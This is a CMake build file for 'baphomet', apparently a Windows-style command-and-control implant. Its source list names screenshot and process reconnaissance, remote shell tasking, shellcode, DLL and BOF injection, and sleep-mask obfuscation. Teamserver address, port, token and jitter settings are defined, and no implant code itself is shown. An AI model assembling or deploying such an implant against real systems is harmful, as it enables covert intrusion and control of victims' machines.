cmake_minimum_required(VERSION 3.28)
project(baphomet)

set(CMAKE_CXX_STANDARD 17)
set(MAIN_INCLUDE_DIR ${CMAKE_CURRENT_SOURCE_DIR}/include)

add_library(baphomet SHARED src/main.cpp
        src/networking/http/send.cpp
        src/networking/http/init.cpp
        src/networking/http/recieve.cpp

        src/reconaissance/screenshot.cpp
        src/reconaissance/basic.cpp
        src/reconaissance/procenum.cpp

        src/util/hash.cpp
        src/util/dispatch.cpp
        src/util/io.cpp
        src/util/memory.cpp
        src/util/basic.cpp

        src/tasking/basic/filesystem.cpp
        src/tasking/basic/shell.cpp
        src/tasking/injection/runbof.cpp
        src/tasking/injection/beacon_api.cpp
        src/tasking/injection/shellcode.cpp
        src/tasking/injection/runexe.cpp
        src/tasking/injection/rundll.cpp

        src/obfuscation/sleep.cpp

        include/main.hpp
        include/beacon_api.hpp
        include/common.hpp
        include/filesystem.hpp
        include/function_ptrs.hpp
        include/http.hpp
        include/injection.hpp
        include/io.hpp
        include/macro.hpp
        include/misc.hpp
        include/reconaissance.hpp
        include/shell.hpp
        include/sleep.hpp
        include/structs.hpp
        src/reconaissance/whoami.cpp
)

#TODO: make these configs work
target_compile_definitions(baphomet PRIVATE CFG_CALLBACK_OBJECT="-")
target_compile_definitions(baphomet PRIVATE CFG_TEAMSERVER_ADDRESS="127.0.0.1")
target_compile_definitions(baphomet PRIVATE CFG_TEAMSERVER_PORT=8081)
target_compile_definitions(baphomet PRIVATE CFG_ACCESS_TOKEN="-")
target_compile_definitions(baphomet PRIVATE CFG_USER_AGENT="-")
target_compile_definitions(baphomet PRIVATE CFG_SLEEP_TIME=2500)
target_compile_definitions(baphomet PRIVATE CFG_JITTER=2500)
target_compile_definitions(baphomet PRIVATE CFG_USE_HTTPS=false)

target_compile_definitions(baphomet PRIVATE BAPHOMET_DEBUG)
target_compile_definitions(baphomet PRIVATE BAPHOMET_USE_SLEEPMASK)
target_include_directories(baphomet PRIVATE ${MAIN_INCLUDE_DIR})